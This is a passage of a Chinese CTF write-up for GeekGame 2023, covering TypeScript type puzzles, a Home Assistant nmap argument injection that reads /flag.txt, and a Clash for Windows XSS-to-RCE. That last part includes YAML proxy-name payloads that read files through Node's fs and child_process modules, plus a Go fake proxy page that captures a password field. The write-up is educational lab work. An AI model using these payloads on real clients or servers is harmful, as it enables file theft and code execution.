+<span class="nt">&lt;script&gt;</span>
+<span class="c1">// check if Service Worker is supported</span>
+<span class="k">if </span><span class="p">(</span><span class="dl">'</span><span class="s1">serviceWorker</span><span class="dl">'</span> <span class="k">in</span> <span class="nb">navigator</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nb">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="dl">'</span><span class="s1">/swjs2/</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">scope</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/</span><span class="dl">"</span> <span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">registration</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Service Worker registered with scope:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">registration</span><span class="p">.</span><span class="nx">scope</span><span class="p">);</span>
+  <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Service Worker registration failed:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
+  <span class="p">});</span>
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>并且生效的还需要 <code class="language-plaintext highlighter-rouge">/swjs2/</code> 说明自己是个 JS + 有效的 SW 范围是整个域名，这需要这样的 header：</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"Content-Type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"application/javascript; charset=UTF-8"</span><span class="p">,</span><span class="w"> </span><span class="nl">"Service-Worker-Allowed"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="简单的打字稿">简单的打字稿</h2>
+
+<p>类型体操。通过返回的 stderr 获取 flag，并且 stderr 里面不能有 flag 这个字符串。Deno 直接 nix-shell 跑一个就行。</p>
+
+<p>第一问网上找个切割字符串的 type，然后：</p>
+
+<div class="language-typescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">type</span> <span class="nx">flag1</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">flag{114514}</span><span class="dl">"</span>
+
+<span class="kd">type</span> <span class="nx">Split</span><span class="o">&lt;</span><span class="nx">S</span> <span class="kd">extends</span> <span class="kr">string</span><span class="p">,</span> <span class="nx">D</span> <span class="kd">extends</span> <span class="kr">string</span><span class="o">&gt;</span> <span class="o">=</span>
+    <span class="kr">string</span> <span class="kd">extends</span> <span class="nx">S</span> <span class="p">?</span> <span class="kr">string</span><span class="p">[]</span> <span class="p">:</span>
+    <span class="nx">S</span> <span class="kd">extends</span> <span class="dl">''</span> <span class="p">?</span> <span class="p">[]</span> <span class="p">:</span>
+    <span class="nx">S</span> <span class="kd">extends</span> <span class="s2">`</span><span class="p">${</span><span class="nx">infer</span> <span class="nx">T</span><span class="p">}${</span><span class="nx">D</span><span class="p">}${</span><span class="nx">infer</span> <span class="nx">U</span><span class="p">}</span><span class="s2">`</span> <span class="p">?</span> <span class="p">[</span><span class="nx">T</span><span class="p">,</span> <span class="p">...</span><span class="nx">Split</span><span class="o">&lt;</span><span class="nx">U</span><span class="p">,</span> <span class="nx">D</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">:</span> <span class="p">[</span><span class="nx">S</span><span class="p">];</span>
+
+<span class="kd">type</span> <span class="nx">zenithal</span> <span class="o">=</span> <span class="nx">Split</span><span class="o">&lt;</span><span class="nx">flag1</span><span class="p">,</span> <span class="dl">"</span><span class="s2">{</span><span class="dl">"</span><span class="o">&gt;</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="kd">let</span> <span class="nx">x</span><span class="p">:</span> <span class="nx">zenithal</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">{}</span><span class="dl">"</span>
+</code></pre></div></div>
+
+<p>第二问比较折磨，因为 <code class="language-plaintext highlighter-rouge">object | { new (): { v: () =&gt; (a: (a: unknown, b: { 'flag{...}': never } &amp; Record&lt;string, string&gt;) =&gt; never) =&gt; unknown } }</code> 这个类型实在太过奇怪，只能一步一步拆。</p>
+
+<div class="language-typescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">type</span> <span class="nx">flag2</span> <span class="o">=</span> <span class="nx">object</span> <span class="o">|</span> <span class="p">{</span> <span class="k">new </span><span class="p">():</span> <span class="p">{</span> <span class="na">v</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="na">a</span><span class="p">:</span> <span class="p">(</span><span class="na">a</span><span class="p">:</span> <span class="nx">unknown</span><span class="p">,</span> <span class="na">b</span><span class="p">:</span> <span class="p">{</span> <span class="dl">'</span><span class="s1">flag{exampleflag}</span><span class="dl">'</span><span class="p">:</span> <span class="nx">never</span> <span class="p">}</span> <span class="o">&amp;</span> <span class="nb">Record</span><span class="o">&lt;</span><span class="kr">string</span><span class="p">,</span> <span class="kr">string</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">never</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">unknown</span> <span class="p">}</span> <span class="p">}</span>
+<span class="kd">type</span> <span class="nx">zenithal0</span> <span class="o">=</span> <span class="nb">Extract</span><span class="o">&lt;</span><span class="nx">flag2</span><span class="p">,</span> <span class="p">{</span> <span class="k">new </span><span class="p">():</span> <span class="p">{}</span> <span class="p">}</span><span class="o">&gt;</span>
+<span class="c1">// type zenithal0 = new () =&gt; {</span>
+<span class="c1">//     v: () =&gt; (a: (a: unknown, b: {</span>
+<span class="c1">//         'flag{exampleflag}': never;</span>
+<span class="c1">//     } &amp; Record&lt;string, string&gt;) =&gt; never) =&gt; unknown;</span>
+<span class="c1">// }</span>
+<span class="kd">type</span> <span class="nx">zenithal1</span> <span class="o">=</span> <span class="nb">InstanceType</span><span class="o">&lt;</span><span class="nx">zenithal0</span><span class="o">&gt;</span>
+<span class="c1">// type zenithal1 = {</span>
+<span class="c1">//     v: () =&gt; (a: (a: unknown, b: {</span>
+<span class="c1">//         'flag{exampleflag}': never;</span>
+<span class="c1">//     } &amp; Record&lt;string, string&gt;) =&gt; never) =&gt; unknown;</span>
+<span class="c1">// }</span>
+<span class="kd">type</span> <span class="nx">ExtractFunctionFromConstructedType</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span> <span class="o">=</span> <span class="nx">T</span> <span class="kd">extends</span> <span class="p">{</span> <span class="p">[</span><span class="nx">K</span> <span class="k">in</span> <span class="kr">keyof</span> <span class="nx">T</span><span class="p">]:</span> <span class="nx">infer</span> <span class="nx">V</span> <span class="p">}</span> <span class="p">?</span> <span class="p">(</span><span class="nx">V</span> <span class="nf">extends </span><span class="p">(...</span><span class="nx">args</span><span class="p">:</span> <span class="kr">any</span><span class="p">[])</span> <span class="o">=&gt;</span> <span class="kr">any</span> <span class="p">?</span> <span class="nx">V</span> <span class="p">:</span> <span class="nx">never</span><span class="p">)</span> <span class="p">:</span> <span class="nx">never</span><span class="p">;</span>
+<span class="kd">type</span> <span class="nx">zenithal2</span> <span class="o">=</span> <span class="nx">ExtractFunctionFromConstructedType</span><span class="o">&lt;</span><span class="nx">zenithal1</span><span class="o">&gt;</span>
+<span class="c1">// type zenithal2 = () =&gt; (a: (a: unknown, b: {</span>
+<span class="c1">//     'flag{exampleflag}': never;</span>
+<span class="c1">// } &amp; Record&lt;string, string&gt;) =&gt; never) =&gt; unknown</span>
+<span class="kd">type</span> <span class="nx">zenithal3</span> <span class="o">=</span> <span class="nx">zenithal2</span> <span class="nf">extends </span><span class="p">(...</span><span class="nx">args</span><span class="p">:</span> <span class="kr">any</span><span class="p">[])</span> <span class="o">=&gt;</span> <span class="nx">infer</span> <span class="nx">R</span> <span class="p">?</span> <span class="nx">ExtractParams</span><span class="o">&lt;</span><span class="nx">R</span><span class="o">&gt;</span> <span class="p">:</span> <span class="nx">never</span><span class="p">;</span>
+<span class="c1">// type zenithal3 = [a: (a: unknown, b: {</span>
+<span class="c1">//     'flag{exampleflag}': never;</span>
+<span class="c1">// } &amp; Record&lt;string, string&gt;) =&gt; never]</span>
+<span class="kd">type</span> <span class="nx">zenithal4</span> <span class="o">=</span> <span class="nx">zenithal3</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="c1">// type zenithal4 = (a: unknown, b: {</span>
+<span class="c1">//     'flag{exampleflag}': never;</span>
+<span class="c1">// } &amp; Record&lt;string, string&gt;) =&gt; never</span>
+<span class="kd">type</span> <span class="nx">zenithal5</span> <span class="o">=</span> <span class="nb">Parameters</span><span class="o">&lt;</span><span class="nx">zenithal4</span><span class="o">&gt;</span>
+<span class="c1">// type zenithal5 = [a: unknown, b: {</span>
+<span class="c1">//     'flag{exampleflag}': never;</span>
+<span class="c1">// } &amp; Record&lt;string, string&gt;]</span>
+<span class="kd">type</span> <span class="nx">zenithal6</span> <span class="o">=</span> <span class="nx">zenithal5</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="c1">// type zenithal6 = {</span>
+<span class="c1">//     'flag{exampleflag}': never;</span>
+<span class="c1">// } &amp; Record&lt;string, string&gt;</span>
+
+<span class="c1">// 接下来问题来了：怎么处理这个 intersection？</span>
+<span class="c1">// 我们确实有办法把它变成一个 object，像这样：</span>
+<span class="c1">// https://stackoverflow.com/questions/61542365/for-typescript-intersection-type-type-c-a-b-how-to-see-resulting-type-sig</span>
+<span class="kd">type</span> <span class="nx">ExpandOriginal</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span> <span class="o">=</span> <span class="nx">T</span> <span class="kd">extends</span> <span class="nx">infer</span> <span class="nx">U</span> <span class="p">?</span> <span class="p">{</span> <span class="p">[</span><span class="nx">K</span> <span class="k">in</span> <span class="kr">keyof</span> <span class="nx">U</span><span class="p">]:</span> <span class="nx">U</span><span class="p">[</span><span class="nx">K</span><span class="p">]</span> <span class="p">}</span> <span class="p">:</span> <span class="nx">never</span><span class="p">;</span>
+<span class="kd">type</span> <span class="nx">soyo0</span> <span class="o">=</span> <span class="nx">ExpandOriginal</span><span class="o">&lt;</span><span class="nx">zenithal6</span><span class="o">&gt;</span>
+<span class="c1">// type soyo0 = {</span>
+<span class="c1">//     [x: string]: string;</span>
+<span class="c1">//     'flag{example}': never;</span>
+<span class="c1">// }</span>
+<span class="c1">// 但是这样的后果是，我们有一个 value 类型是 never 的 key（而且这个类型是冲突的！），而这样的类型似乎会在 typescript 里面带来很大的麻烦。</span>
+<span class="c1">// 解决方法是：观察 Expand，可以发现我们有办法掐死 never</span>
+<span class="kd">type</span> <span class="nx">Expand</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span> <span class="o">=</span> <span class="nx">T</span> <span class="kd">extends</span> <span class="nx">infer</span> <span class="nx">U</span> <span class="p">?</span> <span class="p">{</span> <span class="p">[</span><span class="nx">K</span> <span class="k">in</span> <span class="kr">keyof</span> <span class="nx">U</span><span class="p">]:</span> <span class="p">(</span><span class="nx">U</span><span class="p">[</span><span class="nx">K</span><span class="p">]</span> <span class="kd">extends</span> <span class="p">[</span><span class="nx">never</span><span class="p">]</span> <span class="p">?</span> <span class="kc">true</span> <span class="p">:</span> <span class="kc">false</span><span class="p">)</span> <span class="p">}</span> <span class="p">:</span> <span class="nx">never</span><span class="p">;</span>
+<span class="kd">type</span> <span class="nx">zenithal7</span> <span class="o">=</span> <span class="nx">Expand</span><span class="o">&lt;</span><span class="nx">zenithal6</span><span class="o">&gt;</span>
+<span class="c1">// type zenithal7 = {</span>
+<span class="c1">//     [x: string]: false;</span>
+<span class="c1">//     'flag{example}': true;</span>
+<span class="c1">// }</span>
+<span class="c1">// 很好，碍事的 never 没了</span>
+<span class="kd">type</span> <span class="nx">TrueProps</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="p">[</span><span class="nx">P</span> <span class="k">in</span> <span class="kr">keyof</span> <span class="nx">T</span> <span class="k">as</span> <span class="nx">T</span><span class="p">[</span><span class="nx">P</span><span class="p">]</span> <span class="kd">extends</span> <span class="kc">true</span> <span class="p">?</span> <span class="nx">P</span> <span class="p">:</span> <span class="nx">never</span><span class="p">]:</span> <span class="kr">any</span>
+<span class="p">};</span>
+<span class="c1">// 上面这个是 GPT-4 写的类型</span>
+<span class="c1">// 我在后面加了 : any（否则会报错 https://stackoverflow.com/questions/71019327/mapped-type-compiler-error-when-strict-is-true-mapped-object-type-implicitly-ha）</span>
+<span class="c1">// 以及 `as`, see https://stackoverflow.com/questions/49397567/how-to-remove-properties-via-mapped-type-in-typescript</span>
+<span class="kd">type</span> <span class="nx">zenithal8</span> <span class="o">=</span> <span class="kr">keyof</span> <span class="nx">TrueProps</span><span class="o">&lt;</span><span class="nx">zenithal7</span><span class="o">&gt;</span>
+<span class="c1">// type zenithal8 = "flag{example}"</span>
+<span class="c1">// 很好，于是这个问题规约到了第一问</span>
+<span class="kd">type</span> <span class="nx">zenithal9</span> <span class="o">=</span> <span class="nx">Split</span><span class="o">&lt;</span><span class="nx">zenithal8</span><span class="p">,</span> <span class="dl">"</span><span class="s2">{</span><span class="dl">"</span><span class="o">&gt;</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="c1">// flag 里面有 flag，所以只能这样写分段获取</span>
+<span class="kd">type</span> <span class="nx">zenithal10</span> <span class="o">=</span> <span class="nx">Split</span><span class="o">&lt;</span><span class="nx">zenithal9</span><span class="p">,</span> <span class="dl">"</span><span class="s2">f</span><span class="dl">"</span><span class="o">&gt;</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+
+<span class="kd">let</span> <span class="nx">x</span><span class="p">:</span> <span class="nx">zenithal10</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">b</span><span class="dl">"</span><span class="p">};</span>
+</code></pre></div></div>
+
+<h2 id="逝界计划">逝界计划</h2>
+
+<p class="center"><img src="/pictures/geekgame-2023/hass.png" alt="HomeAssistant" /></p>
+
+<p>Home Assistant 的 integrations 真 TM 得多。去源代码里头 ripgrep 了 <code class="language-plaintext highlighter-rouge">open\(.+\)</code> 一无所获。</p>
+
+<p>第二阶段提示用 nmap，那就简单了：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-F</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span> 10 <span class="nt">--host-timeout</span> 5s <span class="nt">-iL</span> /flag.txt <span class="nt">-oN</span> /config/flag
+</code></pre></div></div>
+
+<p>然后建个备份下下来就好了。</p>
+
+<h2 id="非法所得">非法所得</h2>
+
+<p>这题挺不错的，VNC 和 Electron 还能这么用，学到了。</p>
+
+<p>首先很明显是 <a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/2710">https://github.com/Fndroid/clash_for_windows_pkg/issues/2710</a>。
+然后可以发现 <code class="language-plaintext highlighter-rouge">alert()</code> 能用（虽然弹了之后就要删环境重来了，因为那个弹框关不掉）。</p>
+
+<p>于是获得第一个 flag，需要读文件：</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">port</span><span class="pi">:</span> <span class="m">7890</span>
+<span class="na">socks-port</span><span class="pi">:</span> <span class="m">7891</span>
+<span class="na">allow-lan</span><span class="pi">:</span> <span class="kc">true</span>
+<span class="na">mode</span><span class="pi">:</span> <span class="s">Rule</span>
+<span class="na">log-level</span><span class="pi">:</span> <span class="s">info</span>
+<span class="na">external-controller</span><span class="pi">:</span> <span class="s">:9090</span>
+<span class="na">proxies</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">a&lt;img/src="1"/onerror=eval(`alert(require('fs').readFileSync('/app/profiles/flag.yml'));`);&gt;</span>
+    <span class="na">type</span><span class="pi">:</span> <span class="s">socks5</span>
+    <span class="na">server</span><span class="pi">:</span> <span class="s">127.0.0.1</span>
+    <span class="na">port</span><span class="pi">:</span> <span class="s2">"</span><span class="s">17938"</span>
+    <span class="na">skip-cert-verify</span><span class="pi">:</span> <span class="kc">true</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">abc</span>
+    <span class="na">type</span><span class="pi">:</span> <span class="s">socks5</span>
+    <span class="na">server</span><span class="pi">:</span> <span class="s">127.0.0.1</span>
+    <span class="na">port</span><span class="pi">:</span> <span class="s2">"</span><span class="s">8088"</span>
+    <span class="na">skip-cert-verify</span><span class="pi">:</span> <span class="kc">true</span>
+
+<span class="na">proxy-groups</span><span class="pi">:</span>
+  <span class="pi">-</span>
+    <span class="na">name</span><span class="pi">:</span> <span class="s">&lt;img/src="1"/onerror=eval(`alert(require('fs').readFileSync('/app/profiles/flag.yml'));`);&gt;</span>
+    <span class="na">type</span><span class="pi">:</span> <span class="s">select</span>
+    <span class="na">proxies</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="s">a&lt;img/src="1"/onerror=eval(`alert(require('fs').readFileSync('/app/profiles/flag.yml'));`);&gt;</span>
+</code></pre></div></div>
+
+<p>第二个 flag 需要我们当中间人。先找个<a href="https://gist.github.com/yowu/f7dc34bd4736a65ff28d">代理的实现</a>改一改：</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+
+<span class="k">import</span> <span class="p">(</span>
+	<span class="s">"flag"</span>
+	<span class="s">"log"</span>
+	<span class="s">"net"</span>
+	<span class="s">"net/http"</span>
+	<span class="s">"strings"</span>
+<span class="p">)</span>
+
+<span class="c">// Hop-by-hop headers. These are removed when sent to the backend.</span>
+<span class="c">// http://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html</span>
+<span class="k">var</span> <span class="n">hopHeaders</span> <span class="o">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span>
+	<span class="s">"Connection"</span><span class="p">,</span>
+	<span class="s">"Keep-Alive"</span><span class="p">,</span>
+	<span class="s">"Proxy-Authenticate"</span><span class="p">,</span>
+	<span class="s">"Proxy-Authorization"</span><span class="p">,</span>
+	<span class="s">"Te"</span><span class="p">,</span> <span class="c">// canonicalized version of "TE"</span>
+	<span class="s">"Trailers"</span><span class="p">,</span>
+	<span class="s">"Transfer-Encoding"</span><span class="p">,</span>
+	<span class="s">"Upgrade"</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">copyHeader</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span> <span class="n">http</span><span class="o">.</span><span class="n">Header</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">vv</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">src</span> <span class="p">{</span>
+		<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">v</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">vv</span> <span class="p">{</span>
+			<span class="n">dst</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">delHopHeaders</span><span class="p">(</span><span class="n">header</span> <span class="n">http</span><span class="o">.</span><span class="n">Header</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">h</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">hopHeaders</span> <span class="p">{</span>
+		<span class="n">header</span><span class="o">.</span><span class="n">Del</span><span class="p">(</span><span class="n">h</span><span class="p">)</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">appendHostToXForwardHeader</span><span class="p">(</span><span class="n">header</span> <span class="n">http</span><span class="o">.</span><span class="n">Header</span><span class="p">,</span> <span class="n">host</span> <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
+	<span class="c">// If we aren't the first proxy retain prior</span>
+	<span class="c">// X-Forwarded-For information as a comma+space</span>
+	<span class="c">// separated list and fold multiple headers into one.</span>
+	<span class="k">if</span> <span class="n">prior</span><span class="p">,</span> <span class="n">ok</span> <span class="o">:=</span> <span class="n">header</span><span class="p">[</span><span class="s">"X-Forwarded-For"</span><span class="p">];</span> <span class="n">ok</span> <span class="p">{</span>
+		<span class="n">host</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">prior</span><span class="p">,</span> <span class="s">", "</span><span class="p">)</span> <span class="o">+</span> <span class="s">", "</span> <span class="o">+</span> <span class="n">host</span>
+	<span class="p">}</span>
+	<span class="n">header</span><span class="o">.</span><span class="n">Set</span><span class="p">(</span><span class="s">"X-Forwarded-For"</span><span class="p">,</span> <span class="n">host</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="k">type</span> <span class="n">proxy</span> <span class="k">struct</span> <span class="p">{</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="p">(</span><span class="n">p</span> <span class="o">*</span><span class="n">proxy</span><span class="p">)</span> <span class="n">ServeHTTP</span><span class="p">(</span><span class="n">wr</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">req</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">RemoteAddr</span><span class="p">,</span> <span class="s">" "</span><span class="p">,</span> <span class="n">req</span><span class="o">.</span><span class="n">Method</span><span class="p">,</span> <span class="s">" "</span><span class="p">,</span> <span class="n">req</span><span class="o">.</span><span class="n">URL</span><span class="p">)</span>
+
+	<span class="c">//http: Request.RequestURI can't be set in client requests.</span>
+	<span class="c">//http://golang.org/src/pkg/net/http/client.go</span>
+	<span class="n">req</span><span class="o">.</span><span class="n">RequestURI</span> <span class="o">=</span> <span class="s">""</span>
+
+	<span class="n">delHopHeaders</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">Header</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">clientIP</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">net</span><span class="o">.</span><span class="n">SplitHostPort</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">RemoteAddr</span><span class="p">);</span> <span class="n">err</span> <span class="o">==</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="n">appendHostToXForwardHeader</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">Header</span><span class="p">,</span> <span class="n">clientIP</span><span class="p">)</span>
+	<span class="p">}</span>
+
+	<span class="c">// resp, err := client.Do(req)</span>
+	<span class="c">// if err != nil {</span>
+	<span class="c">// 	http.Error(wr, "Server Error", http.StatusInternalServerError)</span>
+	<span class="c">// 	log.Fatal("ServeHTTP:", err)</span>
+	<span class="c">// }</span>
+	<span class="c">// defer resp.Body.Close()</span>
+
+	<span class="c">// log.Println(req.RemoteAddr, " ", resp.Status)</span>
+
+	<span class="c">// delHopHeaders(resp.Header)</span>
+
+	<span class="c">// copyHeader(wr.Header(), resp.Header)</span>
+	<span class="c">// wr.WriteHeader(resp.StatusCode)</span>
+	<span class="c">// io.Copy(wr, resp.Body)</span>
+	<span class="c">// wr.WriteHeader(200)</span>
+	<span class="n">wr</span><span class="o">.</span><span class="n">Header</span><span class="p">()</span><span class="o">.</span><span class="n">Set</span><span class="p">(</span><span class="s">"Content-Type"</span><span class="p">,</span> <span class="s">"text/html"</span><span class="p">)</span>
+	<span class="n">wr</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"原神启动&lt;p id='show'&gt;&lt;/p&gt;&lt;input id='primogem_code' type='password' /&gt;&lt;script&gt;var x=document.getElementById('primogem_code'); var y=document.getElementById('show'); setTimeout(() =&gt; {y.innerHTML = x.value}, 3000);&lt;/script&gt;"</span><span class="p">))</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="k">var</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s">"addr"</span><span class="p">,</span> <span class="s">":19198"</span><span class="p">,</span> <span class="s">"The addr of the application."</span><span class="p">)</span>
+	<span class="n">flag</span><span class="o">.</span><span class="n">Parse</span><span class="p">()</span>
+
+	<span class="n">handler</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">proxy</span><span class="p">{}</span>
+
+	<span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Starting proxy server on"</span><span class="p">,</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">http</span><span class="o">.</span><span class="n">ListenAndServe</span><span class="p">(</span><span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="n">handler</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s">"ListenAndServe:"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>And then:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">port</span><span class="pi">:</span> <span class="m">7890</span>
+<span class="na">socks-port</span><span class="pi">:</span> <span class="m">7891</span>
+<span class="na">allow-lan</span><span class="pi">:</span> <span class="kc">true</span>
+<span class="na">mode</span><span class="pi">:</span> <span class="s">Rule</span>
+<span class="na">log-level</span><span class="pi">:</span> <span class="s">info</span>
+<span class="na">external-controller</span><span class="pi">:</span> <span class="s">:9090</span>
+<span class="na">proxies</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">a</span>
+    <span class="na">type</span><span class="pi">:</span> <span class="s">http</span>
+    <span class="na">server</span><span class="pi">:</span> <span class="s">aoi.taoky.moe</span>
+    <span class="na">port</span><span class="pi">:</span> <span class="s2">"</span><span class="s">19198"</span>
+    <span class="na">skip-cert-verify</span><span class="pi">:</span> <span class="kc">true</span>
+<span class="na">proxy-groups</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">bb</span>
+    <span class="na">type</span><span class="pi">:</span> <span class="s">select</span>
+    <span class="na">proxies</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s">a</span>
+<span class="na">rules</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="s">MATCH,a</span>
+  <span class="pi">-</span> <span class="s">DOMAIN-SUFFIX,pku.edu.cn,a</span>
+</code></pre></div></div>
+
+<p>然后访问 ys.pku.edu.cn 即可。上面代码忘了加 html encoding，不过问题不大，反正拿到 flag 了。</p>
+
+<p>第三问已知可以这么读取程序输出：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nf">execSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">/app/readflag</span><span class="dl">'</span><span class="p">).</span><span class="nf">toString</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>于是规约到第一问，Q.E.D.</p>
+
+<h2 id="汉化绿色版免费下载">汉化绿色版免费下载</h2>
+
+<p>什么嘛，我还是解包过 kirikiri 的游戏的嘛。</p>
+
+<p>之前因为 wine 跑 kirikiri 游戏有点问题（主要是 CPU 占用高得离谱），我特地研究过怎么用 krkr 的开源实现 <a href="https://github.com/krkrsdl2/krkrsdl2">krkrsdl2</a> 跑 <a href="https://store.steampowered.com/app/583090/SeaBed/">SeaBed</a>（百合视觉小说，故事很感人，推荐），如果有兴趣的话可以阅读 <a href="https://notes.taoky.moe/krkrsdl2">https://notes.taoky.moe/krkrsdl2</a>。</p>
+
+<p>直接用 wine 跑需要设置 wine 语言为中文（等价于 Windows 里面设置「非 Unicode 程序的语言」），否则你会看到这个：</p>
+
+<p class="center"><img src="/pictures/geekgame-2023/krkr-gb2312.png" alt="乱码" /></p>
+
+<p>用脚后跟猜测是 Windows 的 codepage 和 A 系列 API 有关的问题。</p>
+
+<p>所以第一问用 <a href="https://github.com/UserUnknownFactor/krkr-xp3">https://github.com/UserUnknownFactor/krkr-xp3</a> 就行。如果要用 krkrsdl2 跑题目，得改一些文件的编码（改到 UTF-16 LE 或者 UTF-8），否则跑不起来。</p>
+
